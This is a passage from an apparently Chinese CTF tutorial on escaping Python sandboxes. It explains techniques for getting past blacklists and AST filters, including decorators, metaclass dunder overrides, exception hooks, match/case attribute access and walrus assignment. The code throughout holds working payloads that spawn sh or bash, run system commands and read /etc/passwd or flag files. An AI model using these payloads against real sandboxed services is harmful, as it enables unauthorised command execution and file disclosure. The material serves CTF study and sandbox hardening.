    builtins.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250603194452776.png" alt="image-20250603194452776"></p>
<p>可以看到成功执行了。</p>
<h4 id="异步栈帧逃逸"><a href="#异步栈帧逃逸" class="headerlink" title="异步栈帧逃逸"></a>异步栈帧逃逸</h4><pre><code class="highlight python"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">a</span>():
    <span class="keyword">pass</span>
a().cr_frame.f_globals</code></pre>

<h3 id="变量覆盖与函数篡改"><a href="#变量覆盖与函数篡改" class="headerlink" title="变量覆盖与函数篡改"></a>变量覆盖与函数篡改</h3><p>优雅啊，很优雅啊。。</p>
<p>这里简单一些的就是给出blacklist但是是可控的，可以直接改变量然后直接执行命令就可以了</p>
<p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p>
<p>sys.modules 存放了现有模块的引用, 通过访问 <code>sys.modules[&#39;__main__&#39;]</code> 就可以访问当当前模块定义的所有函数以及全局变量</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; aaa = &#x27;bbb&#x27;
&gt;&gt;&gt; def my_input():
...     dict_global = dict()
...     while True:
...       try:
...           input_data = input(&quot;&gt; &quot;)
...       except EOFError:
...           print()
...           break
...       except KeyboardInterrupt:
...           print(&#x27;bye~~&#x27;)
...           continue
...       if input_data == &#x27;&#x27;:
...           continue
...       try:
...           complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)
...       except SyntaxError as err:
...           print(err)
...           continue
...       try:
...           exec(complie_code, dict_global)
...       except Exception as err:
...           print(err)
... 
&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;]
&lt;module &#x27;__main__&#x27; (built-in)&gt;
&gt;&gt;&gt; dir(sys.modules[&#x27;__main__&#x27;])
[&#x27;__annotations__&#x27;, &#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;aaa&#x27;, &#x27;my_input&#x27;, &#x27;sys&#x27;]
&gt;&gt;&gt; sys.modules[&#x27;__main__&#x27;].aaa
&#x27;bbb&#x27;</code></pre>

<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 <code>__builtins__</code>篡改内置函数等,这只是一个思路.</p>
<p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p>
<h4 id="利用-gc-获取已删除模块"><a href="#利用-gc-获取已删除模块" class="headerlink" title="利用 gc 获取已删除模块"></a>利用 gc 获取已删除模块</h4><p>这个思路来源于 <a target="_blank" rel="noopener" href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano – github</a></p>
<p>这道题的目标是覆盖 <code>__main__</code> 中的 <code>__exit</code> 函数,但是题目将 <code>sys.modules[&#39;__main__&#39;]</code> 删除了,无法直接获取.</p>
<pre><code class="highlight plaintext">for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]</code></pre>

<p><code>gc</code> 是Python的内置模块，全名为”garbage collector”，中文译为”垃圾回收”。<code>gc</code> 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。<code>gc</code> 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 <code>gc</code> 模块中的主要函数：</p>
<ol>
<li><code>gc.collect(generation=2)</code>：这个函数会立即触发一次垃圾回收。你可以通过 <code>generation</code> 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</li>
<li><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</li>
<li><code>gc.get_referrers(*objs)</code>：这个函数会返回指向 <code>objs</code> 中任何一个对象的对象列表。</li>
</ol>
<p>exp 如下</p>
<pre><code class="highlight plaintext">for obj in gc.get_objects():
    if &#x27;__name__&#x27; in dir(obj):
        if &#x27;__main__&#x27; in obj.__name__:
            print(&#x27;Found module __main__&#x27;)
            mod_main = obj
        if &#x27;os&#x27; == obj.__name__:
            print(&#x27;Found module os&#x27;)
            mod_os = obj
mod_main.__exit = lambda x : print(&quot;[+] bypass&quot;)</code></pre>

<p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p>
<h4 id="利用-traceback-获取模块"><a href="#利用-traceback-获取模块" class="headerlink" title="利用 traceback 获取模块"></a>利用 traceback 获取模块</h4><p>这个思路来源于 <a target="_blank" rel="noopener" href="https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md">writeup by hstocks – github</a></p>
<p>主动抛出异常, 并获取其后要执行的代码, 然后将<code>__exit</code> 进行替换, 思路也是十分巧妙.</p>
<pre><code class="highlight plaintext">try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # has a reference to the audit function
    while nxt_frame:
        if &#x27;audit&#x27; in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals[&#x27;__exit&#x27;] = print

    # Now we&#x27;re free to call whatever we want
    os.system(&#x27;cat /flag*&#x27;)</code></pre>

<p>但是实际测试时使用 python 3.11 发现 <code>nxt_frame = tb.tb_frame</code> 会触发 <code>object.__getattr__</code> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 python 3.9 (题目版本)中适用</p>
<h3 id="模块重载-原module被篡改"><a href="#模块重载-原module被篡改" class="headerlink" title="模块重载(原module被篡改)"></a>模块重载(原module被篡改)</h3><p>为什么要<strong>重载</strong>呢？因为目标模块&#x2F;方法在一开始就被<strong>删除&#x2F;覆盖</strong>了，但是通过一些手段，就可以重新加载这些模块</p>
<pre><code class="highlight bash">&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&lt;built-in <span class="keyword">function</span> <span class="built_in">eval</span>&gt;
&gt;&gt;&gt; del __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]
Traceback (most recent call last):
  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;
KeyError: <span class="string">&#x27;eval&#x27;</span></code></pre>

<h4 id="reload-重新加载"><a href="#reload-重新加载" class="headerlink" title="reload 重新加载"></a>reload 重新加载</h4><p>reload函数在不同版本中的位置不同</p>
<pre><code class="highlight plaintext">Python 2.x
&gt;&gt;&gt;reload(module)

Python 2.x-3.3
&gt;&gt;&gt;import imp
&gt;&gt;&gt;impo.reload(module)

Python 3.4-latest
&gt;&gt;&gt;import importlib
&gt;&gt;&gt;importlib.reload(module)</code></pre>

<p>reload 函数可以重新加载模块，这样被删除的函数能被重新加载</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;
&gt;&gt;&gt; del __builtins__.__dict__[&#x27;eval&#x27;]
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;
&gt;&gt;&gt; reload(__builtins__)
&lt;module &#x27;__builtin__&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
&lt;built-in function eval&gt;</code></pre>

<p>在 Python 3 中，reload() 函数被移动到 <code>importlib</code> 模块中，所以如果要使用 reload() 函数，需要先导入<code> importlib</code> 模块。</p>
<p>貌似新版本的 python 即使运行了<code> importlib.reload</code> 也无法恢复了。</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; importlib.reload(__builtins__)
&lt;module &#x27;builtins&#x27; (built-in)&gt;
&gt;&gt;&gt; __builtins__.__dict__[&#x27;eval&#x27;]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
KeyError: &#x27;eval&#x27;</code></pre>

<h4 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a>恢复 <code>sys.modules</code></h4><p>一些过滤中可能将 <code>sys.modules[&#39;os&#39;]</code> 进行修改. 这个时候即使将 <code>os</code> 模块导入进来,也是无法使用的.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;
&gt;&gt;&gt; __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</code></pre>

<p>由于很多别的命令执行库也使用到了 os,因此也会受到相应的影响,例如 subprocess</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __import__(&#x27;subprocess&#x27;).Popen(&#x27;whoami&#x27;, shell=True)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 688, in &lt;module&gt;
    class Popen(object):
  File &quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;, line 1708, in Popen
    def _handle_exitstatus(self, sts, _WIFSIGNALED=os.WIFSIGNALED,
AttributeError: &#x27;str&#x27; object has no attribute &#x27;WIFSIGNALED&#x27;</code></pre>

<p>由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可.</p>
<pre><code class="highlight plaintext">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27; # oj 为你加的

del sys.modules[&#x27;os&#x27;]
import os
os.system(&#x27;ls&#x27;)</code></pre>

<h4 id="globals"><a href="#globals" class="headerlink" title="globals()"></a>globals()</h4><p>有些时候沙箱会设置</p>
<pre><code class="highlight plaintext">def blacklist_fun_callback(*args):
    print(&quot;Player! It&#x27;s already banned!&quot;)

vars = blacklist_fun_callback
attr = blacklist_fun_callback
dir = blacklist_fun_callback
getattr = blacklist_fun_callback
exec = blacklist_fun_callback
__import__ = blacklist_fun_callback
compile = blacklist_fun_callback</code></pre>

<p>来覆盖内置函数，限制函数的使用。</p>
<p>但是<code>builtins</code>是一个不可变的模块对象，这样修改仅能够在当前的作用域中生效，而 globals() 中存放了 builtins 模块的索引，因此可以通过下面的方式获取到原始的方法。</p>
<pre><code class="highlight plaintext">globals()[&quot;__builtins__&quot;][&#x27;breakpoint&#x27;]</code></pre>

<p>但是题目如果使用了下面的方式来删除，那就没有办法了，即使 reload 重新导入 <code>builtins</code> 模块，较新版本的 python 中也无法恢复。</p>
<pre><code class="highlight plaintext">del globals()[&quot;__builtins__&quot;].breakpoint</code></pre>

<h3 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h3><p>AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 <code>ast.Import|ast.ImportFrom|ast.Call</code> 这三类操作, 这样一来就无法导入模块和执行函数.</p>
<pre><code class="highlight plaintext">import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print(&quot;-- Please enter code (last line must contain only --END)&quot;)
source_code = &quot;&quot;
while True:
  line = sys.stdin.readline()
  if line.startswith(&quot;--END&quot;):
    break
  source_code += line

tree = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print(&quot;-- Executing safe code:&quot;)
  compiled = compile(source_code, &quot;input.py&quot;, &#x27;exec&#x27;)
  exec(compiled)</code></pre>

<p>下面的 without call 来源于 hacktricks</p>
<h4 id="without-call"><a href="#without-call" class="headerlink" title="without call"></a>without call</h4><p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p>
<h5 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a><strong>装饰器</strong></h5><p>利用 payload 如下，乍一看可能有些迷惑，但该 payload 实际上等效于 exec(input(X))</p>
<pre><code class="highlight plaintext">@exec
@input
class X:
    pass</code></pre>

<p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; @exec
... @input
... class X:
...     pass
... 
&lt;class &#x27;__main__.X&#x27;&gt;__import__(&quot;os&quot;).system(&quot;ls&quot;)</code></pre>

<p>由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.</p>
<p>其实这样的话,构造其实可以有很多,比如使用单层的装饰器，打开 help 函数.</p>
<pre><code class="highlight plaintext">@help
class X:
    pass</code></pre>

<p>这样可以直接进入帮助文档:</p>
<pre><code class="highlight plaintext">Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)</code></pre>

<p>再次输入 !sh 即可打开 &#x2F;bin&#x2F;sh</p>
<p>或是给装饰器加一些参数。</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@getattr(os,&quot;system&quot;)
@fake_wrapper
def something():
  pass</code></pre>

<p>相当于：</p>
<pre><code class="highlight plaintext">getattr(os,&quot;system&quot;)(fake_wrapper(something))</code></pre>

<p>亦或者自定义一个装饰器：</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@os.system
@fake_wrapper
def something():
  pass</code></pre>

<p>相当于 <code>os.system(fake_wrapper(something))</code>，也就是 <code>os.system(‘/bin/sh’)</code></p>
<h5 id="函数覆盖"><a href="#函数覆盖" class="headerlink" title="函数覆盖"></a><strong>函数覆盖</strong></h5><p>我们知道在 Python 中获取一个的属性例如 <code>obj[argument]</code> 实际上是调用的 <code>obj.__getitem__</code> 方法.因此只需要覆盖其 <code>__getitem__</code> 方法, 即可在使用 <code>obj[argument]</code> 执行代码:</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; class A:
...     __getitem__ = exec
... 
&gt;&gt;&gt; A()[&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;]</code></pre>

<p>但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 <code>ast.Call</code>. 如何在不执行构造函数的情况下获取类实例呢?</p>
<p><strong><code>metaclass</code> 利用</strong></p>
<p>Python 中提供了一种元类(<code>metaclass</code>)概念。元类是创建类的“类”。在 Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p>
<p>元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p>
<p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __getitem__ = exec 
    
class Sub(metaclass=Metaclass):
    pass

Sub[&#x27;import os; os.system(&quot;sh&quot;)&#x27;]</code></pre>

<p>除了 <code>__getitem__</code> 之外其他方法的利用方式如下:</p>
<pre><code class="highlight plaintext">__sub__ (k - &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mul__ (k * &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__floordiv__ (k // &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__truediv__ (k / &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mod__ (k % &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__pow__ (k**&#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__lt__ (k &lt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__le__ (k &lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__eq__ (k == &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ne__ (k != &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ge__ (k &gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__gt__ (k &gt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iadd__ (k += &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__isub__ (k -= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__imul__ (k *= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ifloordiv__ (k //= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__idiv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__itruediv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;) (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ipow__ (k **= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ilshift__ (k&lt;&lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__irshift__ (k &gt;&gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iand__ (k = &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ior__ (k |= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ixor__ (k ^= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</code></pre>

<p>示例:</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __sub__ = exec
    
class Sub(metaclass=Metaclass):
    pass

Sub-&#x27;import os; os.system(&quot;sh&quot;)&#x27;</code></pre>

<p><strong>exceptions 利用</strong></p>
<p>利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:</p>
<pre><code class="highlight plaintext">class RCE(Exception):
    def __init__(self):
        self += &#x27;import os; os.system(&quot;sh&quot;)&#x27;
    __iadd__ = exec 
    
raise RCE</code></pre>

<p>raise 会进入 RCE 的 <code>__init__</code>, 然后触发 <code>__iadd__</code> 也就是 exec.</p>
<p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p>
<pre><code class="highlight plaintext">class X:
    def __init__(self, a, b, c):
        self += &quot;os.system(&#x27;sh&#x27;)&quot;
    __iadd__ = exec
sys.excepthook = X
1/0</code></pre>

<p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p>
<pre><code class="highlight plaintext">class X():
  def __init__(self, a, b, c, d, e):
    self += &quot;print(open(&#x27;flag&#x27;).read())&quot;
  __iadd__ = eval
__builtins__.__import__ = X
&#123;&#125;[1337]</code></pre>

<p>这个 payload 将 <code>__import__</code> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <code>__import__</code>.</p>
<h5 id="通过-license-函数读取文件"><a href="#通过-license-函数读取文件" class="headerlink" title="通过 license 函数读取文件"></a>通过 license 函数读取文件</h5><pre><code class="highlight plaintext">__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>

<p>上面的 payload 修改内建函数 license 的文件名列表为 &#x2F;etc&#x2F;passwd 当调用 <code>license()</code> 时会打印这个文件的内容.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&quot;license&quot;]._Printer__filenames
[&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/../LICENSE&#x27;, &#x27;/usr/lib/python3.11/LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/LICENSE&#x27;, &#x27;./LICENSE.txt&#x27;, &#x27;./LICENSE&#x27;]</code></pre>

<p>payload 中将 help 类的 <code>__enter__</code> 方法覆盖为 <code>license</code> 方法, 而 with 语句在创建上下文时会调用 help 的<code>__enter__</code>, 从而执行 <code>license</code> 方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的. 例如:</p>
<pre><code class="highlight plaintext">class MyContext:
    pass
    
__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = MyContext()
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>

<h4 id="打印-AST"><a href="#打印-AST" class="headerlink" title="打印 AST"></a>打印 AST</h4><pre><code class="highlight plaintext">import os
import ast 

BAD_ATS = &#123;
  ast.Attribute,
  ast.AST,
  ast.Subscript,
  ast.comprehension,
  ast.Delete,
  ast.Try,
  ast.For,
  ast.ExceptHandler,
  ast.With,
  ast.Import,
  ast.ImportFrom,
  ast.Assign,
  ast.AnnAssign,
  ast.Constant,
  ast.ClassDef,
  ast.AsyncFunctionDef,
&#125;

a = &#x27;&#x27;&#x27;
[
    system:=111,
    bash:=222
]
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))


for x in ast.walk(compile(a, &quot;&lt;QWB7th&gt;&quot;, &quot;exec&quot;, flags=ast.PyCF_ONLY_AST)):
  if type(x) in BAD_ATS:
    print(type(x))
    exit()

print(&quot;[+] OK&quot;)</code></pre>

<h4 id="绕过-ast-Attribute-获取属性"><a href="#绕过-ast-Attribute-获取属性" class="headerlink" title="绕过 ast.Attribute 获取属性"></a>绕过 ast.Attribute 获取属性</h4><p>如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match&#x2F;case，类似其他语言中的 switch&#x2F;case，但 match&#x2F;case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。</p>
<p>最简单的示例，匹配字符串：</p>
<pre><code class="highlight plaintext">item = 2

match item:
    case 1:
        print(&quot;One&quot;)
    case 2:
        print(&quot;Two&quot;)

# Two</code></pre>

<p>还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。</p>
<pre><code class="highlight plaintext">item = (1, 2)

match item:
    case (x, y, z):
        print(f&quot;&#123;x&#125; &#123;y&#125; &#123;z&#125;&quot;)
    case (x, y):
        print(f&quot;&#123;x&#125; &#123;y&#125;&quot;)
    case (x,):
        print(f&quot;&#123;x&#125;&quot;)</code></pre>

<p>对于基本类型的匹配比较好理解，下面是一个匹配类的示例：</p>
<pre><code class="highlight plaintext">class AClass:
    def __init__(self, value):
        self.thing = value

item = AClass(32)

match item:
    case AClass(thing=x):
        print(f&quot;Got &#123;x = &#125;!&quot;)

# Got x = 32!</code></pre>

<p>在这个示例中，重点关注<code>case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 <code>AClass</code> 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</p>
<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code>&#39;&#39;.__class__</code>，可以编写如下的 match&#x2F;case 语句：</p>
<pre><code class="highlight plaintext">match str():
    case str(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>

<p>可以看到 x 就是 <code>&#39;&#39;.__class__</code>. 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>

<p>再测试一下该 payload 的 AST：</p>
<pre><code class="highlight plaintext">import os
import ast 

a = &#x27;&#x27;&#x27;
match str():
    case str(__class__=x):
        print(x)
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))</code></pre>

<p>AST 如下：</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Match(
            subject=Call(
                func=Name(id=&#x27;str&#x27;, ctx=Load()),
                args=[],
                keywords=[]),
            cases=[
                match_case(
                    pattern=MatchClass(
                        cls=Name(id=&#x27;str&#x27;, ctx=Load()),
                        patterns=[],
                        kwd_attrs=[
                            &#x27;__class__&#x27;],
                        kwd_patterns=[
                            MatchAs(name=&#x27;x&#x27;)]),
                    body=[
                        Expr(
                            value=Call(
                                func=Name(id=&#x27;print&#x27;, ctx=Load()),
                                args=[
                                    Name(id=&#x27;x&#x27;, ctx=Load())],
                                keywords=[]))])])],
    type_ignores=[])</code></pre>

<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>
<p>我们可以构造替代 <code>&#39;&#39;.__class__.__base__.__subclasses__()</code>的 payload：</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=clazz):
        match clazz:
            case object(__base__=bass):
                match bass:
                    case object(__subclasses__=subclazz):
                        print(subclazz)</code></pre>

<h4 id="绕过-ast-Assign-赋值变量"><a href="#绕过-ast-Assign-赋值变量" class="headerlink" title="绕过 ast.Assign 赋值变量"></a>绕过 ast.Assign 赋值变量</h4><p>ast.Assign 无法使用时，我们无法直接使用 &#x3D; 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
<pre><code class="highlight plaintext">[
    system:=111,
    bash:=222
]</code></pre>

<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Expr(
            value=List(
                elts=[
                    NamedExpr(
                        target=Name(id=&#x27;system&#x27;, ctx=Store()),
                        value=Constant(value=111)),
                    NamedExpr(
                        target=Name(id=&#x27;bash&#x27;, ctx=Store()),
                        value=Constant(value=222))],
                ctx=Load()))],
    type_ignores=[])</code></pre>

<h4 id="绕过-ast-Constant-获取数字、字符串"><a href="#绕过-ast-Constant-获取数字、字符串" class="headerlink" title="绕过 ast.Constant 获取数字、字符串"></a>绕过 ast.Constant 获取数字、字符串</h4><p>题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。 例如：</p>
<pre><code class="highlight plaintext">&quot;&quot; : str()
0  : len([])
&quot;0&quot;: str(len([]))
&quot;1&quot;: str(len([str()])) 或 str(len([min]))
&quot;2&quot;: str(len([str(),str()])) 或 str(len([min,max]))
&#x27;A&#x27;: chr(len([min,min,min,min,min])*len([min,min,min,min,min,min,min,min,min,min,min,min,min]))</code></pre>

<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。</p>
<p>当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：<a target="_blank" rel="noopener" href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 绕过基于字符串匹配的过滤</a> 中有提到过。</p>
<p>在这个 payload 中，需要构造出 _wrap_close、system、bash</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>

<p>那么就可以通过下面的方式获取到这几个字符串：</p>
<pre><code class="highlight plaintext">list(dict(system=[]))[0]            # system
list(dict(_wrap_close=[]))[0]       # _wrap_close
list(dict(bash=[]))[0]              # bash</code></pre>

<h4 id="绕过-ast-Subscript-获取列表-字典元素"><a href="#绕过-ast-Subscript-获取列表-字典元素" class="headerlink" title="绕过 ast.Subscript 获取列表&#x2F;字典元素"></a>绕过 ast.Subscript 获取列表&#x2F;字典元素</h4><p>题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
<pre><code class="highlight plaintext">min(list(dict(system=[])))            # system
min(list(dict(_wrap_close=[])))       # _wrap_close
min(list(dict(bash=[])))              # bash</code></pre>

<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match&#x2F;case 来获取。</p>
<pre><code class="highlight plaintext">match globals:
    case object(get=get_func):
        get_func(&quot;system&quot;)</code></pre>

<h4 id="绕过-ast-For-遍历列表"><a href="#绕过-ast-For-遍历列表" class="headerlink" title="绕过 ast.For 遍历列表"></a>绕过 ast.For 遍历列表</h4><p>在构造最终 payload 中，我们还需要在 <code>__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>

<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：</p>
<pre><code class="highlight plaintext">def filter_func(subclazzes_item):
    [ _wrap_close:=min(list(dict(_wrap_close=[])))]
    match subclazzes_item:
        case object(_＿name_＿=name):
            if name==_wrap_close:
